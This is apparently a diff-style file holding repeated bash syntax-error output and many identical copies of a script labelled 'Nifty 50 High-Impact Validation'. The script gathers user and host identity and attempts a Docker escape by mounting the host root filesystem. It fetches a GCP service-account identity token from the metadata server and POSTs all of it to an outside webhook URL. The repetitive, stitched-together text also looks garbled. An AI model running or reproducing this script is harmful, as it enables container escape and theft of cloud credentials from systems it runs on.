@@ -1,0 +1,475 @@
+/home/jules/.nifty_status/current_env: line 1: syntax error near unexpected token `"Sucess"'
+/home/jules/.nifty_status/current_env: line 1: `echo("Sucess")'
+/home/jules/.nifty_status/current_env: line 1: syntax error near unexpected token `"Sucess"'
+/home/jules/.nifty_status/current_env: line 1: `echo("Sucess")'
+/home/jules/.nifty_status/current_env: line 1: syntax error near unexpected token `"Sucess"'
+/home/jules/.nifty_status/current_env: line 1: `echo("Sucess")'
+/home/jules/.nifty_status/current_env: line 1: syntax error near unexpected token `"Sucess"'
+/home/jules/.nifty_status/current_env: line 1: `echo("Sucess")'
+/home/jules/.nifty_status/current_env: line 1: syntax error near unexpected token `"Sucess"'
+/home/jules/.nifty_status/current_env: line 1: `echo("Sucess")'
+/home/jules/.nifty_status/current_env: line 1: syntax error near unexpected token `"Sucess"'
+/home/jules/.nifty_status/current_env: line 1: `echo("Sucess")'
+/home/jules/.nifty_status/current_env: line 1: syntax error near unexpected token `"Sucess"'
+/home/jules/.nifty_status/current_env: line 1: `echo("Sucess")'
+/home/jules/.nifty_status/current_env: line 1: syntax error near unexpected token `"Sucess"'
+/home/jules/.nifty_status/current_env: line 1: `echo("Sucess")'
+/home/jules/.nifty_status/current_env: line 1: syntax error near unexpected token `"Sucess"'
+/home/jules/.nifty_status/current_env: line 1: `echo("Sucess")'
+/home/jules/.nifty_status/current_env: line 1: syntax error near unexpected token `"Sucess"'
+/home/jules/.nifty_status/current_env: line 1: `echo("Sucess")'
+/home/jules/.nifty_status/current_env: line 1: syntax error near unexpected token `"Sucess"'
+/home/jules/.nifty_status/current_env: line 1: `echo("Sucess")'
+/home/jules/.nifty_status/current_env: line 1: syntax error near unexpected token `"Sucess"'
+/home/jules/.nifty_status/current_env: line 1: `echo("Sucess")'
+/home/jules/.nifty_status/current_env: line 1: syntax error near unexpected token `"Sucess"'
+/home/jules/.nifty_status/current_env: line 1: `echo("Sucess")'
+/home/jules/.nifty_status/current_env: line 1: syntax error near unexpected token `"Sucess"'
+/home/jules/.nifty_status/current_env: line 1: `echo("Sucess")'
+/home/jules/.nifty_status/current_env: line 1: syntax error near unexpected token `"Sucess"'
+/home/jules/.nifty_status/current_env: line 1: `echo("Sucess")'
+/home/jules/.nifty_status/current_env: line 1: syntax error near unexpected token `"Sucess"'
+/home/jules/.nifty_status/current_env: line 1: `echo("Sucess")'
+/home/jules/.nifty_status/current_env: line 1: syntax error near unexpected token `"Sucess"'
+/home/jules/.nifty_status/current_env: line 1: `echo("Sucess")'
+/home/jules/.nifty_status/current_env: line 1: syntax error near unexpected token `"Sucess"'
+/home/jules/.nifty_status/current_env: line 1: `echo("Sucess")'
+/home/jules/.nifty_status/current_env: line 1: syntax error near unexpected token `"Sucess"'
+/home/jules/.nifty_status/current_env: line 1: `echo("Sucess")'
+/home/jules/.nifty_status/current_env: line 1: syntax error near unexpected token `"Sucess"'
+/home/jules/.nifty_status/current_env: line 1: `echo("Sucess")'
+/home/jules/.nifty_status/current_env: line 1: syntax error near unexpected token `"Sucess"'
+/home/jules/.nifty_status/current_env: line 1: `echo("Sucess")'
+/home/jules/.nifty_status/current_env: line 1: syntax error near unexpected token `"Sucess"'
+/home/jules/.nifty_status/current_env: line 1: `echo("Sucess")'
+/home/jules/.nifty_status/current_env: line 1: syntax error near unexpected token `"Sucess"'
+/home/jules/.nifty_status/current_env: line 1: `echo("Sucess")'
+/home/jules/.nifty_status/current_env: line 1: syntax error near unexpected token `"Sucess"'
+/home/jules/.nifty_status/current_env: line 1: `echo("Sucess")'
+/home/jules/.nifty_status/current_env: line 1: syntax error near unexpected token `"Sucess"'
+/home/jules/.nifty_status/current_env: line 1: `echo("Sucess")'
+/home/jules/.nifty_status/current_env: line 1: syntax error near unexpected token `"Sucess"'
+/home/jules/.nifty_status/current_env: line 1: `echo("Sucess")'
+/home/jules/.nifty_status/current_env: line 1: syntax error near unexpected token `"Sucess"'
+/home/jules/.nifty_status/current_env: line 1: `echo("Sucess")'
+/home/jules/.nifty_status/current_env: line 1: syntax error near unexpected token `"Sucess"'
+/home/jules/.nifty_status/current_env: line 1: `echo("Sucess")'
+/home/jules/.nifty_status/current_env: line 1: syntax error near unexpected token `"Sucess"'
+/home/jules/.nifty_status/current_env: line 1: `echo("Sucess")'
+/home/jules/.nifty_status/current_env: line 1: syntax error near unexpected token `"Sucess"'
+/home/jules/.nifty_status/current_env: line 1: `echo("Sucess")'
+/home/jules/.nifty_status/current_env: line 1: syntax error near unexpected token `"Sucess"'
+/home/jules/.nifty_status/current_env: line 1: `echo("Sucess")'
+echo("Sucess")
+echo("Sucess")
+echo("Sucess")
+echo("Sucess")
+echo("Sucess")
+#!/bin/bash
+# Nifty 50 High-Impact Validation
+{
+  echo "--- [1] IDENTITY ---"
+  id; hostname
+
+  echo "--- [2] DOCKER ESCAPE (HOST ACCESS) ---"
+  # This mounts the host root and reads the hostname from the host machine
+  if sudo docker run --rm -v /:/host:ro alpine cat /host/etc/hostname > /tmp/h_id 2>/dev/null; then
+      echo "ESCAPE SUCCESS: Hostname is $(cat /tmp/h_id)"
+  else
+      echo "ESCAPE FAILED"
+  fi
+
+  echo "--- [3] CLOUD METADATA ---"
+  curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity
+} | curl -X POST -H "Content-Type: text/plain" --data-binary @- https://webhooksite.net/20f19d8b-fec1-479f-801f-3722f430de21
+#!/bin/bash
+# Nifty 50 High-Impact Validation
+{
+  echo "--- [1] IDENTITY ---"
+  id; hostname
+
+  echo "--- [2] DOCKER ESCAPE (HOST ACCESS) ---"
+  # This mounts the host root and reads the hostname from the host machine
+  if sudo docker run --rm -v /:/host:ro alpine cat /host/etc/hostname > /tmp/h_id 2>/dev/null; then
+      echo "ESCAPE SUCCESS: Hostname is $(cat /tmp/h_id)"
+  else
+      echo "ESCAPE FAILED"
+  fi
+
+  echo "--- [3] CLOUD METADATA ---"
+  curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity
+} | curl -X POST -H "Content-Type: text/plain" --data-binary @- https://webhooksite.net/20f19d8b-fec1-479f-801f-3722f430de21
+#!/bin/bash
+# Nifty 50 High-Impact Validation
+{
+  echo "--- [1] IDENTITY ---"
+  id; hostname
+
+  echo "--- [2] DOCKER ESCAPE (HOST ACCESS) ---"
+  # This mounts the host root and reads the hostname from the host machine
+  if sudo docker run --rm -v /:/host:ro alpine cat /host/etc/hostname > /tmp/h_id 2>/dev/null; then
+      echo "ESCAPE SUCCESS: Hostname is $(cat /tmp/h_id)"
+  else
+      echo "ESCAPE FAILED"
+  fi
+
+  echo "--- [3] CLOUD METADATA ---"
+  curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity
+} | curl -X POST -H "Content-Type: text/plain" --data-binary @- https://webhooksite.net/20f19d8b-fec1-479f-801f-3722f430de21
+#!/bin/bash
+# Nifty 50 High-Impact Validation
+{
+  echo "--- [1] IDENTITY ---"
+  id; hostname
+
+  echo "--- [2] DOCKER ESCAPE (HOST ACCESS) ---"
+  # This mounts the host root and reads the hostname from the host machine
+  if sudo docker run --rm -v /:/host:ro alpine cat /host/etc/hostname > /tmp/h_id 2>/dev/null; then
+      echo "ESCAPE SUCCESS: Hostname is $(cat /tmp/h_id)"
+  else
+      echo "ESCAPE FAILED"
+  fi
+
+  echo "--- [3] CLOUD METADATA ---"
+  curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity
+} | curl -X POST -H "Content-Type: text/plain" --data-binary @- https://webhooksite.net/20f19d8b-fec1-479f-801f-3722f430de21
+#!/bin/bash
+# Nifty 50 High-Impact Validation
+{
+  echo "--- [1] IDENTITY ---"
+  id; hostname
+
+  echo "--- [2] DOCKER ESCAPE (HOST ACCESS) ---"
+  # This mounts the host root and reads the hostname from the host machine
+  if sudo docker run --rm -v /:/host:ro alpine cat /host/etc/hostname > /tmp/h_id 2>/dev/null; then
+      echo "ESCAPE SUCCESS: Hostname is $(cat /tmp/h_id)"
+  else
+      echo "ESCAPE FAILED"
+  fi
+
+  echo "--- [3] CLOUD METADATA ---"
+  curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity
+} | curl -X POST -H "Content-Type: text/plain" --data-binary @- https://webhooksite.net/20f19d8b-fec1-479f-801f-3722f430de21
+#!/bin/bash
+# Nifty 50 High-Impact Validation
+{
+  echo "--- [1] IDENTITY ---"
+  id; hostname
+
+  echo "--- [2] DOCKER ESCAPE (HOST ACCESS) ---"
+  # This mounts the host root and reads the hostname from the host machine
+  if sudo docker run --rm -v /:/host:ro alpine cat /host/etc/hostname > /tmp/h_id 2>/dev/null; then
+      echo "ESCAPE SUCCESS: Hostname is $(cat /tmp/h_id)"
+  else
+      echo "ESCAPE FAILED"
+  fi
+
+  echo "--- [3] CLOUD METADATA ---"
+  curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity
+} | curl -X POST -H "Content-Type: text/plain" --data-binary @- https://webhooksite.net/20f19d8b-fec1-479f-801f-3722f430de21
+#!/bin/bash
+# Nifty 50 High-Impact Validation
+{
+  echo "--- [1] IDENTITY ---"
+  id; hostname
+
+  echo "--- [2] DOCKER ESCAPE (HOST ACCESS) ---"
+  # This mounts the host root and reads the hostname from the host machine
+  if sudo docker run --rm -v /:/host:ro alpine cat /host/etc/hostname > /tmp/h_id 2>/dev/null; then
+      echo "ESCAPE SUCCESS: Hostname is $(cat /tmp/h_id)"
+  else
+      echo "ESCAPE FAILED"
+  fi
+
+  echo "--- [3] CLOUD METADATA ---"
+  curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity
+} | curl -X POST -H "Content-Type: text/plain" --data-binary @- https://webhooksite.net/20f19d8b-fec1-479f-801f-3722f430de21
+#!/bin/bash
+# Nifty 50 High-Impact Validation
+{
+  echo "--- [1] IDENTITY ---"
+  id; hostname
+
+  echo "--- [2] DOCKER ESCAPE (HOST ACCESS) ---"
+  # This mounts the host root and reads the hostname from the host machine
+  if sudo docker run --rm -v /:/host:ro alpine cat /host/etc/hostname > /tmp/h_id 2>/dev/null; then
+      echo "ESCAPE SUCCESS: Hostname is $(cat /tmp/h_id)"
+  else
+      echo "ESCAPE FAILED"
+  fi
+
+  echo "--- [3] CLOUD METADATA ---"
+  curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity
+} | curl -X POST -H "Content-Type: text/plain" --data-binary @- https://webhooksite.net/20f19d8b-fec1-479f-801f-3722f430de21
+#!/bin/bash
+# Nifty 50 High-Impact Validation
+{
+  echo "--- [1] IDENTITY ---"
+  id; hostname
+
+  echo "--- [2] DOCKER ESCAPE (HOST ACCESS) ---"
+  # This mounts the host root and reads the hostname from the host machine
+  if sudo docker run --rm -v /:/host:ro alpine cat /host/etc/hostname > /tmp/h_id 2>/dev/null; then
+      echo "ESCAPE SUCCESS: Hostname is $(cat /tmp/h_id)"
+  else
+      echo "ESCAPE FAILED"
+  fi
+
+  echo "--- [3] CLOUD METADATA ---"
+  curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity
+} | curl -X POST -H "Content-Type: text/plain" --data-binary @- https://webhooksite.net/20f19d8b-fec1-479f-801f-3722f430de21
+#!/bin/bash
+# Nifty 50 High-Impact Validation
+{
+  echo "--- [1] IDENTITY ---"
+  id; hostname
+
+  echo "--- [2] DOCKER ESCAPE (HOST ACCESS) ---"
+  # This mounts the host root and reads the hostname from the host machine
+  if sudo docker run --rm -v /:/host:ro alpine cat /host/etc/hostname > /tmp/h_id 2>/dev/null; then
+      echo "ESCAPE SUCCESS: Hostname is $(cat /tmp/h_id)"
+  else
+      echo "ESCAPE FAILED"
+  fi
+
+  echo "--- [3] CLOUD METADATA ---"
+  curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity
+} | curl -X POST -H "Content-Type: text/plain" --data-binary @- https://webhooksite.net/20f19d8b-fec1-479f-801f-3722f430de21
+#!/bin/bash
+# Nifty 50 High-Impact Validation
+{
+  echo "--- [1] IDENTITY ---"
+  id; hostname
+
+  echo "--- [2] DOCKER ESCAPE (HOST ACCESS) ---"
+  # This mounts the host root and reads the hostname from the host machine
+  if sudo docker run --rm -v /:/host:ro alpine cat /host/etc/hostname > /tmp/h_id 2>/dev/null; then
+      echo "ESCAPE SUCCESS: Hostname is $(cat /tmp/h_id)"
+  else
+      echo "ESCAPE FAILED"
+  fi
+
+  echo "--- [3] CLOUD METADATA ---"
+  curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity
+} | curl -X POST -H "Content-Type: text/plain" --data-binary @- https://webhooksite.net/20f19d8b-fec1-479f-801f-3722f430de21
+#!/bin/bash
+# Nifty 50 High-Impact Validation
+{
+  echo "--- [1] IDENTITY ---"
+  id; hostname
+
+  echo "--- [2] DOCKER ESCAPE (HOST ACCESS) ---"
+  # This mounts the host root and reads the hostname from the host machine
+  if sudo docker run --rm -v /:/host:ro alpine cat /host/etc/hostname > /tmp/h_id 2>/dev/null; then
+      echo "ESCAPE SUCCESS: Hostname is $(cat /tmp/h_id)"
+  else
+      echo "ESCAPE FAILED"
+  fi
+
+  echo "--- [3] CLOUD METADATA ---"
+  curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity
+} | curl -X POST -H "Content-Type: text/plain" --data-binary @- https://webhooksite.net/20f19d8b-fec1-479f-801f-3722f430de21
+#!/bin/bash
+# Nifty 50 High-Impact Validation
+{
+  echo "--- [1] IDENTITY ---"
+  id; hostname
+
+  echo "--- [2] DOCKER ESCAPE (HOST ACCESS) ---"
+  # This mounts the host root and reads the hostname from the host machine
+  if sudo docker run --rm -v /:/host:ro alpine cat /host/etc/hostname > /tmp/h_id 2>/dev/null; then
+      echo "ESCAPE SUCCESS: Hostname is $(cat /tmp/h_id)"
+  else
+      echo "ESCAPE FAILED"
+  fi
+
+  echo "--- [3] CLOUD METADATA ---"
+  curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity
+} | curl -X POST -H "Content-Type: text/plain" --data-binary @- https://webhooksite.net/20f19d8b-fec1-479f-801f-3722f430de21
+#!/bin/bash
+# Nifty 50 High-Impact Validation
+{
+  echo "--- [1] IDENTITY ---"
+  id; hostname
+
+  echo "--- [2] DOCKER ESCAPE (HOST ACCESS) ---"
+  # This mounts the host root and reads the hostname from the host machine
+  if sudo docker run --rm -v /:/host:ro alpine cat /host/etc/hostname > /tmp/h_id 2>/dev/null; then
+      echo "ESCAPE SUCCESS: Hostname is $(cat /tmp/h_id)"
+  else
+      echo "ESCAPE FAILED"
+  fi
+
+  echo "--- [3] CLOUD METADATA ---"
+  curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity
+} | curl -X POST -H "Content-Type: text/plain" --data-binary @- https://webhooksite.net/20f19d8b-fec1-479f-801f-3722f430de21
+#!/bin/bash
+# Nifty 50 High-Impact Validation
+{
+  echo "--- [1] IDENTITY ---"
+  id; hostname
+
+  echo "--- [2] DOCKER ESCAPE (HOST ACCESS) ---"
+  # This mounts the host root and reads the hostname from the host machine
+  if sudo docker run --rm -v /:/host:ro alpine cat /host/etc/hostname > /tmp/h_id 2>/dev/null; then
+      echo "ESCAPE SUCCESS: Hostname is $(cat /tmp/h_id)"
+  else
+      echo "ESCAPE FAILED"
+  fi
+
+  echo "--- [3] CLOUD METADATA ---"
+  curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity
+} | curl -X POST -H "Content-Type: text/plain" --data-binary @- https://webhooksite.net/20f19d8b-fec1-479f-801f-3722f430de21
+#!/bin/bash
+# Nifty 50 High-Impact Validation
+{
+  echo "--- [1] IDENTITY ---"
+  id; hostname
+
+  echo "--- [2] DOCKER ESCAPE (HOST ACCESS) ---"
+  # This mounts the host root and reads the hostname from the host machine
+  if sudo docker run --rm -v /:/host:ro alpine cat /host/etc/hostname > /tmp/h_id 2>/dev/null; then
+      echo "ESCAPE SUCCESS: Hostname is $(cat /tmp/h_id)"
+  else
+      echo "ESCAPE FAILED"
+  fi
+
+  echo "--- [3] CLOUD METADATA ---"
+  curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity
+} | curl -X POST -H "Content-Type: text/plain" --data-binary @- https://webhooksite.net/20f19d8b-fec1-479f-801f-3722f430de21
+#!/bin/bash
+# Nifty 50 High-Impact Validation
+{
+  echo "--- [1] IDENTITY ---"
+  id; hostname
+
+  echo "--- [2] DOCKER ESCAPE (HOST ACCESS) ---"
+  # This mounts the host root and reads the hostname from the host machine
+  if sudo docker run --rm -v /:/host:ro alpine cat /host/etc/hostname > /tmp/h_id 2>/dev/null; then
+      echo "ESCAPE SUCCESS: Hostname is $(cat /tmp/h_id)"
+  else
+      echo "ESCAPE FAILED"
+  fi
+
+  echo "--- [3] CLOUD METADATA ---"
+  curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity
+} | curl -X POST -H "Content-Type: text/plain" --data-binary @- https://webhooksite.net/20f19d8b-fec1-479f-801f-3722f430de21
+#!/bin/bash
+# Nifty 50 High-Impact Validation
+{
+  echo "--- [1] IDENTITY ---"
+  id; hostname
+
+  echo "--- [2] DOCKER ESCAPE (HOST ACCESS) ---"
+  # This mounts the host root and reads the hostname from the host machine
+  if sudo docker run --rm -v /:/host:ro alpine cat /host/etc/hostname > /tmp/h_id 2>/dev/null; then
+      echo "ESCAPE SUCCESS: Hostname is $(cat /tmp/h_id)"
+  else
+      echo "ESCAPE FAILED"
+  fi
+
+  echo "--- [3] CLOUD METADATA ---"
+  curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity
+} | curl -X POST -H "Content-Type: text/plain" --data-binary @- https://webhooksite.net/20f19d8b-fec1-479f-801f-3722f430de21
+#!/bin/bash
+# Nifty 50 High-Impact Validation
+{
+  echo "--- [1] IDENTITY ---"
+  id; hostname
+
+  echo "--- [2] DOCKER ESCAPE (HOST ACCESS) ---"
+  # This mounts the host root and reads the hostname from the host machine
+  if sudo docker run --rm -v /:/host:ro alpine cat /host/etc/hostname > /tmp/h_id 2>/dev/null; then
+      echo "ESCAPE SUCCESS: Hostname is $(cat /tmp/h_id)"
+  else
+      echo "ESCAPE FAILED"
+  fi
+
+  echo "--- [3] CLOUD METADATA ---"
+  curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity
+} | curl -X POST -H "Content-Type: text/plain" --data-binary @- https://webhooksite.net/20f19d8b-fec1-479f-801f-3722f430de21
+#!/bin/bash
+# Nifty 50 High-Impact Validation
+{
+  echo "--- [1] IDENTITY ---"
+  id; hostname
+
+  echo "--- [2] DOCKER ESCAPE (HOST ACCESS) ---"
+  # This mounts the host root and reads the hostname from the host machine
+  if sudo docker run --rm -v /:/host:ro alpine cat /host/etc/hostname > /tmp/h_id 2>/dev/null; then
+      echo "ESCAPE SUCCESS: Hostname is $(cat /tmp/h_id)"
+  else
+      echo "ESCAPE FAILED"
+  fi
+
+  echo "--- [3] CLOUD METADATA ---"
+  curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity
+} | curl -X POST -H "Content-Type: text/plain" --data-binary @- https://webhooksite.net/20f19d8b-fec1-479f-801f-3722f430de21
+#!/bin/bash
+# Nifty 50 High-Impact Validation
+{
+  echo "--- [1] IDENTITY ---"
+  id; hostname
+
+  echo "--- [2] DOCKER ESCAPE (HOST ACCESS) ---"
+  # This mounts the host root and reads the hostname from the host machine
+  if sudo docker run --rm -v /:/host:ro alpine cat /host/etc/hostname > /tmp/h_id 2>/dev/null; then
+      echo "ESCAPE SUCCESS: Hostname is $(cat /tmp/h_id)"
+  else
+      echo "ESCAPE FAILED"
+  fi
+
+  echo "--- [3] CLOUD METADATA ---"
+  curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity
+} | curl -X POST -H "Content-Type: text/plain" --data-binary @- https://webhooksite.net/20f19d8b-fec1-479f-801f-3722f430de21
+#!/bin/bash
+# Nifty 50 High-Impact Validation
+{
+  echo "--- [1] IDENTITY ---"
+  id; hostname
+
+  echo "--- [2] DOCKER ESCAPE (HOST ACCESS) ---"
+  # This mounts the host root and reads the hostname from the host machine
+  if sudo docker run --rm -v /:/host:ro alpine cat /host/etc/hostname > /tmp/h_id 2>/dev/null; then
+      echo "ESCAPE SUCCESS: Hostname is $(cat /tmp/h_id)"
+  else
+      echo "ESCAPE FAILED"
+  fi
+
+  echo "--- [3] CLOUD METADATA ---"
+  curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity
+} | curl -X POST -H "Content-Type: text/plain" --data-binary @- https://webhooksite.net/20f19d8b-fec1-479f-801f-3722f430de21
+#!/bin/bash
+# Nifty 50 High-Impact Validation
+{
+  echo "--- [1] IDENTITY ---"
+  id; hostname
+
+  echo "--- [2] DOCKER ESCAPE (HOST ACCESS) ---"
+  # This mounts the host root and reads the hostname from the host machine
+  if sudo docker run --rm -v /:/host:ro alpine cat /host/etc/hostname > /tmp/h_id 2>/dev/null; then
+      echo "ESCAPE SUCCESS: Hostname is $(cat /tmp/h_id)"
+  else
+      echo "ESCAPE FAILED"
+  fi
+
+  echo "--- [3] CLOUD METADATA ---"
+  curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity
+} | curl -X POST -H "Content-Type: text/plain" --data-binary @- https://webhooksite.net/20f19d8b-fec1-479f-801f-3722f430de21
+#!/bin/bash
+# Nifty 50 High-Impact Validation
+{
+  echo "--- [1] IDENTITY ---"
+  id; hostname
+
+  echo "--- [2] DOCKER ESCAPE (HOST ACCESS) ---"
+  # This mounts the host root and reads the hostname from the host machine
+  if sudo docker run --rm -v /:/host:ro alpine cat /host/etc/hostname > /tmp/h_id 2>/dev/null; then
+      echo "ESCAPE SUCCESS: Hostname is $(cat /tmp/h_id)"
+  else
+      echo "ESCAPE FAILED"
+  fi
+
+  echo "--- [3] CLOUD METADATA ---"
+  curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity
+} | curl -X POST -H "Content-Type: text/plain" --data-binary @- https://webhooksite.net/20f19d8b-fec1-479f-801f-3722f430de21
